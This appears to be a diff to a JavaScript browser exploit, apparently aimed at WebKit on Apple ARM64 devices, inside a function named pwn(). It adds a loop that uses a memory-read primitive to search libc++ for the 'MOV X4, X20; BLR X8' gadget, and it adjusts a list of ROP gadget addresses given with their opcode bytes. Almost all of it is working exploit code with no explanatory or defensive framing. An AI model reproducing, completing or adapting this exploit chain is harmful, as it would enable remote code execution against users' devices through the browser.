@@ -626,6 +626,36 @@ function pwn() {
     log(`[+] dispatch: ${dispatch}`);
 
 
+
+
+    // 4. MOVX4
+    var znst3_addr = find_symbol_address(libcpp1_base, "___ZNSt3__113basic_ostreamIcNS_11char_traitsIcEEElsEt");
+    log(`[+] znst3_addr: ${znst3_addr}`);
+    try_count = 0;
+    var movx4 = Add(libcpp1_base, znst3_addr);
+    while (true) {
+        if(try_count > 100) {
+            log(`[-] failed webkit patchfinder`);
+            return;
+        }
+
+        // libc++.1:__text:000000018004314C E4 03 14 AA                             MOV             X4, X20
+        // libc++.1:__text:0000000180043150 00 01 3F D6                             BLR             X8
+        opcode = read32(movx4);
+        if(opcode == 0xAA1403E4) {
+            if(read32(Add(movx4, 4)) == 0xD63F0100)
+                break;
+        }
+        movx4 = Add(movx4, 4);
+        try_count++;
+    }
+    log(`[+] movx4: ${movx4}`);
+
+
+
+
+
+
     return;
 
 
@@ -675,7 +705,7 @@ function pwn() {
     //gadgets
     // var stackloader = Add(webcore_base, offsets.stackloader); //v FD 7B 46 A9 F4 4F 45 A9 F6 57 44 A9 F8 5F 43 A9 FA 67 42 A9 FC 6F 41 A9 FF C3 01 91 C0 03 5F D6 
     // var ldrx8 = Add(webcore_base, offsets.ldrx8);    //v E8 03 40 F9 68 02 00 F9 FD 7B 42 A9 F4 4F 41 A9 FF C3 00 91 C0 03 5F D6 
-    var dispatch = Add(coreaudio_base, offsets.dispatch)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
+    // var dispatch = Add(coreaudio_base, offsets.dispatch)   //v A0 02 3F D6 FD 7B 43 A9 F4 4F 42 A9 F6 57 41 A9 FF 03 01 91 C0 03 5F D6
     var movx4 = Add(webcore_base, offsets.movx4);    //v E4 03 14 AA 00 01 3F D6 
     var regloader = Add(libcpp1_base, offsets.regloader); //v E3 03 16 AA E6 03 1B AA E0 03 18 AA E1 03 13 AA E2 03 17 AA E4 03 40 F9 00 01 3F D6
 
